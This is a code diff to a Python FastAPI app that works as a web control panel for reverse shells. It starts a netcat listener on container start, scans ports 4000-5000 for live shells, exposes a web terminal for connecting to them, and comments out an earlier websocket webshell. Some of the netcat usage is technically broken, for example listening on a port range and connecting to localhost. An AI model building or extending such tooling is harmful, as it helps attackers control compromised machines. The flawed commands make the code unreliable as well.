@@ -22,6 +22,10 @@ fs = GridFS(db)
 class FileResponse(BaseModel):
     filename: str
 
+# open a netcat listener on the port range 4000-5000 to receive reverse shells when the container starts
+subprocess.Popen("nc -l -p 4000-5000", shell=True)
+
+
 # index route
 @app.get('/')
 async def index(request: Request):
@@ -89,30 +93,60 @@ async def download_file(filename: str):
     # Return the file data as a response
     return StreamingResponse(grid_file, media_type='application/octet-stream')
 
-# websocket endpoint for reverse shell
-@app.websocket("/ws/{client_id}")
-async def websocket_endpoint(websocket: WebSocket, client_id: int):
-    if connections.find_one({"client_id": client_id}):
-        raise HTTPException(status_code=400, detail="Client ID is already in use")
-    await websocket.accept()
-    connections.insert_one({"client_id": client_id})
-    try:
-        while True:
-            # data = await websocket.receive_text()
-            process = await aiosubprocess.create_subprocess_shell("nc -l -p 4242", stdout=aiosubprocess.PIPE, stderr=aiosubprocess.PIPE)
+# check for open reverse shells on the port range 4000-5000
+@app.get('/reverse-shells')
+async def reverse_shells():
+    open_ports = []
+    for port in range(4000, 5000):
+        try:
+            process = await aiosubprocess.create_subprocess_shell(f"nc -zv localhost {port}", stdout=aiosubprocess.PIPE, stderr=aiosubprocess.PIPE)
             stdout, stderr = await process.communicate()
-            await websocket.send_text(stdout.decode())
+            if "succeeded" in stdout.decode():
+                open_ports.append(port)
+        except:
+            pass
+    return open_ports
+
+# render the reverse shell list in an HTML template
+@app.get('/reverse-shells-view')
+async def reverse_shells_view(request: Request):
+    open_ports = await reverse_shells()
+    return templates.TemplateResponse('reverse_shells.html', {'request': request, 'open_ports': open_ports})
+
+# attempt to connect to a reverse shell on the specified port and open a web terminal
+@app.get('/reverse-shell/{port}')
+async def reverse_shell(request: Request, port: int):
+    try:
+        process = await aiosubprocess.create_subprocess_shell(f"nc localhost {port}", stdout=aiosubprocess.PIPE, stderr=aiosubprocess.PIPE)
+        stdout, stderr = await process.communicate()
+        return templates.TemplateResponse('terminal.html', {'request': request, 'stdout': stdout.decode(), 'stderr': stderr.decode(), 'port': port})
     except:
-        connections.delete_one({"client_id": client_id})
+        return templates.TemplateResponse('terminal.html', {'request': request, 'stderr': "Failed to connect to reverse shell"})
 
-@app.get('/webshell')
-async def webshell(request: Request):
-    active_connections = [doc["client_id"] for doc in connections.find()]
-    return templates.TemplateResponse('reverse_shells.html', {'request': request, 'active_connections': active_connections})
+# # websocket endpoint for reverse shell
+# @app.websocket("/ws/{client_id}")
+# async def websocket_endpoint(websocket: WebSocket, client_id: int):
+#     if connections.find_one({"client_id": client_id}):
+#         raise HTTPException(status_code=400, detail="Client ID is already in use")
+#     await websocket.accept()
+#     connections.insert_one({"client_id": client_id})
+#     try:
+#         while True:
+#             # data = await websocket.receive_text()
+#             process = await aiosubprocess.create_subprocess_shell("nc -l -p 4242", stdout=aiosubprocess.PIPE, stderr=aiosubprocess.PIPE)
+#             stdout, stderr = await process.communicate()
+#             await websocket.send_text(stdout.decode())
+#     except:
+#         connections.delete_one({"client_id": client_id})
 
-@app.get('/webshell/{client_id}')
-async def webshell(request: Request, client_id: int):
-    if not connections.find_one({"client_id": client_id}):
-        raise HTTPException(status_code=400, detail="Client ID is not active")
-    return templates.TemplateResponse('terminal.html', {'request': request, 'client_id': client_id})
+# @app.get('/webshell')
+# async def webshell(request: Request):
+#     active_connections = [doc["client_id"] for doc in connections.find()]
+#     return templates.TemplateResponse('reverse_shells.html', {'request': request, 'active_connections': active_connections})
+
+# @app.get('/webshell/{client_id}')
+# async def webshell(request: Request, client_id: int):
+#     if not connections.find_one({"client_id": client_id}):
+#         raise HTTPException(status_code=400, detail="Client ID is not active")
+#     return templates.TemplateResponse('terminal.html', {'request': request, 'client_id': client_id})
 
